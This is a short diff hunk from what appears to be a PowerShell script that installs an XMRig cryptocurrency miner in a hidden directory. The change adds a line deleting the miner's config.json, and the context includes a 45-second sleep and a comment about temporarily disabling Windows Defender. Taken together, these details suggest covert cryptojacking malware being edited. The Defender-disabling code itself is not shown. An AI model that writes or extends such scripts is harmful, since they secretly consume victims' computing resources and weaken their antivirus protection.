@@ -143,7 +143,7 @@ if (Test-Path -Path $newConfigPath) {
     Write-Output "New bat file not found at the specified path."
 }
 
-#Remove-Item -Path "$hiddenDir\xmrig-6.22.2\w.bat"
+Remove-Item -Path "$hiddenDir\xmrig-6.22.2\config.json"
 # Rename-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe" -NewName "xmrig-6.22.2.exe"
 Start-Sleep -Seconds 45
 # Disable Windows Defender temporarily
